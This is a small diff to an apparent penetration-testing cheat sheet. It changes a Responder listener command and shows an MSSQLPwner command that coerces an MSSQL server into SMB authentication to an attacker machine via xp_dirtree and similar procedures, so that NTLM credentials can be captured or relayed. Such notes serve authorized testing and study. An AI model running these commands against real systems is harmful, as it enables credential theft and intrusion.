@@ -247,7 +247,7 @@ $EncodedText
 
 <ins>Fire up Responder</ins>
 
-- `sudo responder -I tun0` (make sure SMB is turned OFF in /etc/responder/Responder.conf)
+- `sudo responder -I tun0 -A` (make sure SMB is turned OFF in /etc/responder/Responder.conf)
 
 <ins>Trigger SMB authentication</ins>:
 - MSSQLPwner: `mssqlpwner user:pass@<MSSQL INSTANCE IP> -windows-auth ntlm-relay -relay-method (xp_dirtree/xp_subdirs/xp_fileexist) <OUR ATTACKING MACHINE>`
